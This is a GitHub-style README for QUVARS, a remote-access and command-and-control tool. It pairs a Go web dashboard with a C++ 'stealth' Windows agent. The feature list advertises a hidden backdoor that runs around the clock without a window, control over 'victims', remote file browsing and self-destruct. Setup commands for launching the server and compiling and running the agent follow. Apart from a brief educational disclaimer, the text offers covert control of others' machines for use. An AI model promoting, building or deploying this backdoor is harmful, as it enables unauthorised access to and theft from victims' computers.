\*\*Disclaimer\*\* : This software is meant for educational purposes only. I'm not responsible for any malicious use of the app.



\# 🛡️ QUVARS (C2 Framework)



\[!\[MIT License](https://img.shields.io/badge/license-MIT-green.svg)](https://opensource.org/licenses/MIT)

\[!\[Go Version](https://img.shields.io/badge/Go-1.20+-blue.svg)](https://golang.org/)

\[!\[C++](https://img.shields.io/badge/C++-MinGW-orange.svg)](https://www.mingw-w64.org/)



QUVARS is a powerful tool designed to give control of a Windows system remotely and retrieve information from it. The application uses a \*\*Go-based Backend\*\* with a modern Web UI and a \*\*C++ Stealth Agent\*\* for the client side.



> QUVARS works on Windows 7, 8, 10, and 11. The agent is designed to run silently without any console window.







\## 📸 Screenshots

!\[QUVARS Dashboard](https://via.placeholder.com/800x400?text=QUVARS+Dashboard+In+Action)



\## ✨ Features of QUVARS

\* 🥷 \*\*Full Stealth Backdoor:\*\* Agent runs 24/7 in the background with no window.

\* 🖥️ \*\*Modern Web Dashboard:\*\* Manage all victims through a single browser tab.

\* ⚡ \*\*High Performance:\*\* Go-powered backend handles multiple connections concurrently.

\* 💀 \*\*Self-Destruct:\*\* One-click command to remove the agent from the target machine.

\* 📁 \*\*File Explorer:\*\* Browse directories and list files on the remote system.

\* 📡 \*\*Real-time Communication:\*\* Powered by WebSockets for zero-latency command execution.



\## 🚀 Full Installation \& Setup (One-Step Guide)



To get the framework up and running, follow these commands in your terminal:



```bash

\# 1. Clone the project and prepare the environment

git clone \[https://github.com/User-i4k/QRAT](https://github.com/User-i4k/QRAT)

cd QRAT



\# 2. Setup Server (In Terminal 1)

go mod init QRAT

go get \[github.com/gorilla/websocket](https://github.com/gorilla/websocket)

go mod tidy

go run c2\_server.go



\# 3. Compile and Run Agent (In Terminal 2)

g++ agent.cpp -o agent.exe -lws2\_32 -ladvapi32 -lcomctl32 -static

./agent.exe

